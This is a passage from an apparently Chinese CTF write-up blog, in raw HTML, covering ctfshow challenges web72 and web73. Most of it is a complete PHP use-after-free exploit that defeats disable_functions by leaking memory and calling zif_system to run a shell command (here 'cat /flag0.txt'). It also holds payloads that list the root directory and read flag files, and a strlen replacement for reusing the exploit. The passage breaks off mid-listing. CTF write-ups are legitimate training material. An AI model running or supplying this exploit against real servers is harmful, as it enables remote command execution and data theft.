class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>UseAfterFree disable function</p><blockquote><p><a href="https://blog.csdn.net/qq_62414126/article/details/124062044">https://blog.csdn.net/qq_62414126/article/details/124062044</a></p></blockquote><h2 id="为什么在使用eval-函数有时候需要添加-gt"><a href="#为什么在使用eval-函数有时候需要添加-gt" class="headerlink" title="为什么在使用eval()函数有时候需要添加?&gt;"></a>为什么在使用eval()函数有时候需要添加?&gt;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_GET[1]); #如果我们通过&lt;?=`ls`;去执行的话需要在前面添加?&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271079308-e8ea37f7-98ed-4c6d-bb24-97c1fc8eae1e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271079316-0676564d-ce6c-485f-b4a4-0e97d778430d.png" alt="image.png"><br>原因是eval()函数相当于执行php的代码，而<?= 就相当于<?php echo在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的<?php给闭合，不然不会执行。闭合之后就相当于<?php ?> &lt;?=<code>ls</code>;</p><h1 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h1><p>先查看一下文件列表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681223723167-df56bcb3-9699-4868-b367-3d8a06f49f82.png" alt="image.png"><br>flag文件在flagc.txt里面。<br>实际上，这道题可以直接使用include来读取：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>但是看了b站的视频发现是想要用上一道题的payload，但是交了之后发现提示说strlen函数被禁用了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681223844662-48c977ec-a595-46e3-b89b-ecf337552378.png" alt="image.png"><br>然后他的想法是将禁用的strlen函数给重写。<br>那么直接简单重写即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//strlen 返回字符串长度</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">length</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10000</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$length</span> += <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$length</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后修改上一道题的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 